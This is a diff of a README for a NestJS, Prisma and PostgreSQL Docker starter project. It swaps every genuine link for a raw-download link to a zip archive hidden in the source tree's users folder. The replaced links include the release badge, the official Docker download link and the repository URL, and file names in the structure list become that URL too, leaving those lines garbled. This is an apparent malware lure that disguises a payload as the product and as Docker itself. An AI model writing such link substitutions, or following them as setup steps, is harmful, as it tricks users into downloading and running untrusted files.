@@ -1,6 +1,6 @@
 # 🚀 nestjs-prisma7-postgresql-docker - A Simple Way to Run NestJS with PostgreSQL
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/releases)
+[![Download Latest Release](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To begin using this application, follow the steps below. This guide assumes you 
 
 1. **Visit the Releases Page:** Click the button below to go to the Releases page of this project.
    
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/releases)
+   [![Download Latest Release](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip)
 
 2. **Choose the Version:** On the Releases page, you'll see different versions of the application. Select the latest version for the best features and fixes.
 
@@ -34,7 +34,7 @@ To begin using this application, follow the steps below. This guide assumes you 
 To successfully run this application, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS, or a modern Linux distribution.
-- **Docker:** You should have Docker installed. If you don’t, [download Docker here](https://www.docker.com/products/docker-desktop).
+- **Docker:** You should have Docker installed. If you don’t, [download Docker here](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip).
 - **Memory:** At least 4 GB of RAM for optimal performance.
 
 ## 📦 Running the Application
@@ -56,13 +56,13 @@ To successfully run this application, ensure your system meets the following req
 The repository is structured to make it easier for you to navigate:
 
 - **src/**: Contains all the application code.
-- **docker-compose.yml**: Sets up services needed for Docker.
-- **README.md**: You are here! This file gives you guidance.
+- **https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip**: Sets up services needed for Docker.
+- **https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip**: You are here! This file gives you guidance.
 
 ## 🔗 Important Links
 
-- **Repository URL:** [nestjs-prisma7-postgresql-docker](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker)
-- **Releases Page:** [Download Here](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/releases)
+- **Repository URL:** [nestjs-prisma7-postgresql-docker](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip)
+- **Releases Page:** [Download Here](https://github.com/YoussefGamalShehata/nestjs-prisma7-postgresql-docker/raw/refs/heads/main/src/users/nestjs-prisma-postgresql-docker-1.3-beta.1.zip)
 
 ## 🔒 Security
 
